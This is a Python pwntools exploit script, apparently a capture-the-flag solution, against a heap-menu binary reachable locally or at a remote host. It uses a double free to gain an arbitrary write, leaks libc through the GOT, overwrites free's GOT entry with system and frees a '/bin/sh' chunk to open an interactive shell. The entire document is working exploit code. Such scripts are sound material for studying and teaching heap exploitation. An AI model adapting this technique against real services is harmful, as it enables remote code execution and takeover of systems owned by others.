from pwn import *

if len(sys.argv)==1:
    context.log_level='debug'
    p=process("linux_server64")
elif sys.argv[1]=="1":
    p=process("./bin")
    os.system("echo "+str(p.pid)+" > pid")
elif sys.argv[1]=="2":
    context.log_level='debug'
    p=process("./bin")
    os.system("echo "+str(p.pid)+" > pid")
    pause()
elif sys.argv[1]=="3":
    p=remote("functf",18022)

arr = 0x6020A0
#.got.plt:0000000000601018 off_601018      dq offset free
#.got.plt:0000000000601020 off_601020      dq offset puts
#.got.plt:0000000000601028 off_601028      dq offset printf
free_got=0x0000000000602018
puts_got=0x0000000000602020
puts_plt=0x4006a0
printf_plt=0x4006b0

def malloc_0(idx):
    log.info("malloc : "+str(idx))
    p.sendlineafter(">","0")
    p.sendlineafter("idx>",str(idx))

def del_3(idx):
    log.info("del : "+str(idx))
    p.sendlineafter(">","3")
    p.sendlineafter("idx>",str(idx))

def puts_2(idx):
    log.info("puts : "+str(idx))
    p.sendlineafter(">","2")
    p.sendlineafter("idx>",str(idx))

def gets_1(idx,buf):
    log.info("gets : "+str(idx))
    p.sendlineafter(">","1")
    p.sendlineafter("idx>",str(idx))
    p.sendafter("data>",buf)

def leak(idx):
    puts_2(idx)
    buf=p.recvuntil("\n")
    print hexdump(buf)
    return u64(buf[:-1].ljust(8,'\x00'))

malloc_0(0)
malloc_0(1)
malloc_0(2)
malloc_0(3)
malloc_0(4)

del_3(0)
del_3(1)
del_3(0)


malloc_0(1)
malloc_0(2)

payload=p64(arr)
gets_1(0,payload)

malloc_0(3)
gets_1(3,"/bin/sh")
malloc_0(4)

payload=p64(free_got)
gets_1(4,payload)

pause()
libc_free=leak(0)
print 'libc_free:',hex(libc_free)
libc_elf=ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_base=libc_free - libc_elf.sym["free"]
libc_system=libc_base + libc_elf.sym["system"]
print 'libc_system:',hex(libc_system)

payload=p64(libc_system)
payload+=p64(libc_system)
payload+=p64(printf_plt+6)
gets_1(0,payload)

del_3(3)

p.interactive()

